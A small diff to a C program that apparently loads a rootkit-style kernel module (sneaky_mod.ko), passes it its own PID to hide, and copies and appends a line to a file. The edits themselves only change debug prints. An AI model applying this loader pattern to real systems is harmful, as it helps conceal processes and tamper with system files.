@@ -50,7 +50,7 @@ void load_sneaky(char *moduleName) {
   }
   if (cpid == 0) {
     pid_t spid = getpid();
-    printf("Sneaky PID =%d", spid);
+    printf("Sneaky PID =%d\n", spid);
     char spid_arg[60];
     sprintf(spid_arg, "sneaky_pid=%d", spid);
     char *args[4];
@@ -151,7 +151,7 @@ int main() {
   char *moduleName = "sneaky_mod.ko";
   copy_File(inputFile, outputFile);
   add_line(inputFile);
-  printf("I am here\n");
+
   load_sneaky(moduleName);
   printf("Type 'q' to exit\n");
   while (getchar() != 'q') {
